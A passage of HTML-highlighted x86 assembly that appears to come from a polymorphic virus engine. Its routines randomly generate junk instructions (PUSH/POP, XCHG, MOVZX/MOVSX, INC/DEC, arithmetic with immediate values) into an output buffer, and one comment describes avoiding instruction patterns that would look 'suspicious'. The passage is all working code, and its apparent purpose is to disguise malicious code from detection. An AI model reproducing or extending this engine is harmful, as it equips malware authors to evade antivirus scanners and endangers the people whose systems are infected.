                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XCHG</span><span class="sc0">       </span><span class="sc1">; Do XCHG</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@MOVZXSX</span><span class="sc0">    </span><span class="sc1">; Do MOVZX or MOVSX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@INCDEC</span><span class="sc0">     </span><span class="sc1">; Do INC or DEC</span><span class="sc0">

       </span><span class="sc1">;; Let's do PUSH Reg/Garbage/POP Reg</span><span class="sc0">
  </span><span class="sc5">@@PUSHPOP</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">@@PUSHPOP32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">  </span><span class="sc1">; If we can't do more garbage (many recursive</span><span class="sc0">
                               </span><span class="sc1">; calls), select another type</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc1">;Get an initialized register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">; PUSH it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Save the current storage address (EDI)</span><span class="sc0">
   </span><span class="sc5">@@PUSHPOP_4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Current EDI=Saved EDI?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PUSHPOP_4</span><span class="sc0">       </span><span class="sc1">; Then, it means that no garbage were</span><span class="sc0">
                                        </span><span class="sc1">; generated, so jump to make again</span><span class="sc0">
   </span><span class="sc5">@@PUSHPOP_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; Select a not-reserved register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">         </span><span class="sc1">; Construct a POP</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">     </span><span class="sc1">; Return</span><span class="sc0">

        </span><span class="sc1">;; Let's make XCHG Reg32,Reg32, XCHG Reg16,Reg16 or XCHG Reg8,Reg8</span><span class="sc0">
    </span><span class="sc5">@@XCHG</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XCHG32</span><span class="sc0">   </span><span class="sc1">; XCHG Reg32,Reg32 with a 75% of probability,</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@XCHG8</span><span class="sc0">    </span><span class="sc1">; XCHG Reg8,Reg8 with a 25% of probability</span><span class="sc0">
     </span><span class="sc5">@@XCHG32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get a not-reserved initiali-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; zed register and save it in DL</span><span class="sc0">
     </span><span class="sc5">@@XCHG_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get another not-reserved</span><span class="sc0">
                                       </span><span class="sc1">; initialized register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Is the same register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XCHG_01</span><span class="sc0">  </span><span class="sc1">; Then, select another</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; EAX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XCHGWithEAX2</span><span class="sc0"> </span><span class="sc1">; Then, use the optimized opcode</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; EAX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@XCHGWithEAX</span><span class="sc0">  </span><span class="sc1">; Then use the optimized opcode (1 byte)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">; Construct the opcode with the two registers.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">  </span><span class="sc1">; The opcode is 87 C0+Reg1*8+Reg2</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">  </span><span class="sc1">; Return</span><span class="sc0">
      </span><span class="sc5">@@XCHGWithEAX2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">  </span><span class="sc1">; Set the other register (the one which isn't</span><span class="sc0">
                                </span><span class="sc1">; EAX) in AL</span><span class="sc0">
      </span><span class="sc5">@@XCHGWithEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">; Add the mask of the opcode of XCHG Reg,EAX</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">  </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@XCHG8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0"> </span><span class="sc1">; Get a 8 bits register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; Test if we can select anyone (maybe the</span><span class="sc0">
                                    </span><span class="sc1">; four reserved registers are casually</span><span class="sc0">
                                    </span><span class="sc1">; all the E?X)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">   </span><span class="sc1">; If we can't, select another type of garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Save it in DL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0"> </span><span class="sc1">; Get a 8 bits register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Is it the same?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">   </span><span class="sc1">; If it's the same, select another type of</span><span class="sc0">
                                </span><span class="sc1">; garbage, because maybe only one E?X can be</span><span class="sc0">
                                </span><span class="sc1">; selected for garbage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0"> </span><span class="sc1">; Set the mask of "register usage" in the</span><span class="sc0">
                                 </span><span class="sc1">; second opcode</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">  </span><span class="sc1">; Set the other register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">86h</span><span class="sc0"> </span><span class="sc1">; Put the main opcode (86h) in AL</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store the 2 bytes opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">  </span><span class="sc1">; Return</span><span class="sc0">

       </span><span class="sc1">;; Here we make MOVZX Reg32,Reg8/Reg16 or MOVSX Reg32,Reg8/Reg16</span><span class="sc0">
   </span><span class="sc5">@@MOVZXSX</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0">  </span><span class="sc1">; Get a register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Save it in DL</span><span class="sc0">
    </span><span class="sc5">@@MOVZX_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAnyRegisterWithInit</span><span class="sc0"> </span><span class="sc1">;Get any init. register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; Is it the same?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MOVZX_01</span><span class="sc0">   </span><span class="sc1">; If it's the same, select another</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">      </span><span class="sc1">; Set the register number in bits 5-4-3</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Save the second register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">     </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">; AL=Extended opcode (0Fh)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">   </span><span class="sc1">; Get in AH a random B6h, B7h, BEh or BFh</span><span class="sc0">
                                   </span><span class="sc1">; 0F B6: MOVZX Reg32,Any8</span><span class="sc0">
                                   </span><span class="sc1">; 0F B7: MOVZX Reg32,Any16</span><span class="sc0">
                                   </span><span class="sc1">; 0F BE: MOVSX Reg32,Any8</span><span class="sc0">
                                   </span><span class="sc1">; 0F BF: MOVSX Reg32,Any16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Restore register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0"> </span><span class="sc1">; Activate "register usage" with the 8 or 16</span><span class="sc0">
                                 </span><span class="sc1">; bits register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; Set the destiny register</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">            </span><span class="sc1">; Store the third opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">   </span><span class="sc1">; Return</span><span class="sc0">

     </span><span class="sc1">;; Make INC or DEC. This types are only INC Reg32 or INC Reg8</span><span class="sc0">
   </span><span class="sc5">@@INCDEC</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@INC32</span><span class="sc0">    </span><span class="sc1">; Make INC Reg32 with a 75% of probability</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@INC8</span><span class="sc0">     </span><span class="sc1">; Make INC Reg8 with a 25% of probability</span><span class="sc0">
      </span><span class="sc5">@@INC32</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get a not-reserved initiali-</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; zed register and save it in DL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; Get INC if AL=0 or DEC if AL=8</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; Add opcode mask</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Add register mask</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">      </span><span class="sc1">; Return</span><span class="sc0">
             </span><span class="sc1">;; 8 bits version</span><span class="sc0">
      </span><span class="sc5">@@INC8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0"> </span><span class="sc1">; Get a 8 bits register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; If there aren't selectable 8 bits regis-</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">       </span><span class="sc1">; ters, select another type of garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Set the register in DL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; Get INC or DEC</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; Set the register in the second opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Mask the second opcode for "register"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">    </span><span class="sc1">; AL=Main opcode. This opcode has some</span><span class="sc0">
                </span><span class="sc1">; weird instructions that generate exceptions, since the other</span><span class="sc0">
                </span><span class="sc1">; instructions are only for 32 bits, but you can play with the</span><span class="sc0">
                </span><span class="sc1">; DEBUG and generate instructions like CALL AL (FEh D0h) :)</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Return</span><span class="sc0">   </span><span class="sc1">; Return</span><span class="sc0">

 </span><span class="sc1">;; GeneralWithValue begins here. This part generates an instruction from the</span><span class="sc0">
 </span><span class="sc1">;; common most used opcodes 80h and 81h. This time we select a not-reserved</span><span class="sc0">
 </span><span class="sc1">;; register and then we make ADD, OR, ADC, SBB, AND, SUB, XOR or CMP (well,</span><span class="sc0">
 </span><span class="sc1">;; that CMP is substituted by MOV). It's very easy to do.</span><span class="sc0">
     </span><span class="sc5">@@Make1_</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">popf</span><span class="sc0">              </span><span class="sc1">; This is to restore flags from stack and</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Make1</span><span class="sc0">     </span><span class="sc1">; jump to make another type of garbage</span><span class="sc0">
 </span><span class="sc5">@@GeneralWithValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Get a random type</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">             </span><span class="sc1">; Save this new flags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWV_32b</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@GWV_32b</span><span class="sc0">   </span><span class="sc1">; Make a 32 bits one (75% of probability)</span><span class="sc0">
    </span><span class="sc5">@@GWV_8b</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectAReg8</span><span class="sc0"> </span><span class="sc1">; Get a 8 bits register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; Can be selected?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1_</span><span class="sc0">      </span><span class="sc1">; If not, jump (pop flags and select other</span><span class="sc0">
                                    </span><span class="sc1">; type of garbage)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Save the register in DL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">   </span><span class="sc1">; Get a random operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">   </span><span class="sc1">; Were we going to make CMP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GWV8_01</span><span class="sc0">   </span><span class="sc1">; If not, continue</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">  </span><span class="sc1">; Make a MOV</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Mask the register</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWV_02</span><span class="sc0">    </span><span class="sc1">; Jump to insert a random value</span><span class="sc0">
    </span><span class="sc5">@@GWV8_01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Are we going to use AL?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWV_AL</span><span class="sc0">    </span><span class="sc1">; If we use it, use its own opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">   </span><span class="sc1">; Opcode 80h (OP Reg8,Value8)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWV_03</span><span class="sc0">    </span><span class="sc1">; Jump and continue</span><span class="sc0">

    </span><span class="sc5">@@GWV_32b</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc1">; Get an initialized not-re-</span><span class="sc0">
                                                </span><span class="sc1">; served 32 bits register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; DL=Reg32</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">   </span><span class="sc1">; Get a random operation</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GWV_01</span><span class="sc0">    </span><span class="sc1">; If we were going to use CMP, use MOV</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; Check if the register is "touched". If it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">TouchedRegisters</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; is, we avoid</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; moving a value on it (it's very suspicious</span><span class="sc0">
                                  </span><span class="sc1">; to have two MOVs one after another, so just</span><span class="sc0">
                                  </span><span class="sc1">; in case before there is another MOV, we</span><span class="sc0">
                                  </span><span class="sc1">; avoid it).</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1_</span><span class="sc0">    </span><span class="sc1">; If it's "touched", select another type of</span><span class="sc0">
                                  </span><span class="sc1">; garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">  </span><span class="sc1">; MOV instead of CMP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Mask the opcode</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWV_02</span><span class="sc0">    </span><span class="sc1">; Jump to store the value</span><span class="sc0">
    </span><span class="sc5">@@GWV_01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; EAX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GWV_EAX</span><span class="sc0">   </span><span class="sc1">; Then use its own opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">   </span><span class="sc1">; Opcode 81h (OP Reg32,Value32)</span><span class="sc0">
    </span><span class="sc5">@@GWV_03</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Exchange the opcodes in AH and AL</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">  </span><span class="sc1">; Mask the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Set the register to the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@GWV_02</span><span class="sc0">    </span><span class="sc1">; Jump to complete the instruction</span><span class="sc0">
    </span><span class="sc5">@@GWV_EAX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
